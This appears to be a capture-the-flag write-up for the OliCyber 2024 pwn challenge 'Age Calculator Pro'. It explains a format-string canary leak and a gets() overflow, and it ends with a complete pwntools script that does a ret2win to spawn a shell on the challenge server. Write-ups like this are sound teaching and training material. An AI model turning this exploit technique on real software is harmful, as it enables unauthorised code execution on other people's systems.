# Age Calculator Pro

| | |
|---|---|
| **Section** | OliCyber 2024 Selezione Territoriale |
| **Category** | pwn |
| **Solves** | 131 |

## Overview

```
$ checksec --file=age_calculator_pro
Arch:      amd64-64-little
RELRO:     Partial RELRO
Canary:    Canary found
NX:        NX enabled
PIE:       No PIE
Symbols:   45 Symbols
FORTIFY:   No
```

After analyzing the binary with Ghidra, two vulnerabilities emerged: `printf(local_58)` (format string) and `gets(local_58)` (bof). The binary also exposes a `win()` function calling `execve("/bin/sh")` at a static address (no PIE).

The format string leaks the canary — the offset `%37$p` was found by bruteforcing `%N$p` and identifying the canary by its trailing null byte. The bof in `gets` overwrites past `local_58` (72 bytes) with the leaked canary + 8 bytes rbp padding + `win()` address for a ret2win. `cat flag` to get the flag.

## Solve

```python
from pwn import *

chall = remote("agecalculatorpro.challs.olicyber.it", 38103)

chall.recvuntil(b"name?")
chall.sendline(b"%37$p")

leak = chall.recvuntil(b"birth year?")
canary = int(leak.split(b"0x")[1].split(b",")[0], 16)

payload  = b"A" * 72
payload += p64(canary)
payload += b"B" * 8
payload += p64(0x4011f6)

chall.sendline(payload)
chall.interactive()
```
